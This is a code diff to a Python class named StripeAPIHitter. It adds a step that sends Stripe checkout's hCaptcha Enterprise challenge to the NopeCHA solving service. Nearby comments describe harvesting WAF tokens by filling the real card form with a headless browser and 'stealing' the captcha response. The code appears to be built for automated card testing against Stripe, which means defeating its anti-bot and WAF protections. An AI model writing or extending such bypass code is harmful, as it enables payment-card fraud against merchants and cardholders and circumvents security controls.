@@ -2046,6 +2046,23 @@ class StripeAPIHitter:
                                                 except Exception as _pe:
                                                     print(f"[DEBUG WAF PASSIVE] passive rqdata solve failed: {_pe}")
 
+                                            # ── PATH A.1: NopeCHA Cloud API Solver (High Priority) ─────────────
+                                            if not _trawl_captcha_token:
+                                                try:
+                                                    import captcha_solver
+                                                    if captcha_solver.has_any_solver_key():
+                                                        print(f"[DEBUG WAF] Invoking captcha_solver.solve_hcaptcha_enterprise sitekey={_passive_sitekey} rqdata={bool(_passive_rqdata)}...")
+                                                        _nopecha_token = await captcha_solver.solve_hcaptcha_enterprise(
+                                                            sitekey=_passive_sitekey,
+                                                            pageurl="https://checkout.stripe.com",
+                                                            rqdata=_passive_rqdata
+                                                        )
+                                                        if _nopecha_token:
+                                                            _trawl_captcha_token = _nopecha_token
+                                                            print(f"[DEBUG WAF] NopeCHA solved hCaptcha Enterprise token len={len(_trawl_captcha_token)}")
+                                                except Exception as _ne:
+                                                    print(f"[DEBUG WAF] NopeCHA solver failed: {_ne}")
+
                                             # ── PATH B: Playwright WAF Token Harvester ───────────────────────
                                             # Launch Camoufox, fill the actual Stripe card form, submit it,
                                             # intercept the verify_challenge POST to steal the captcha_response
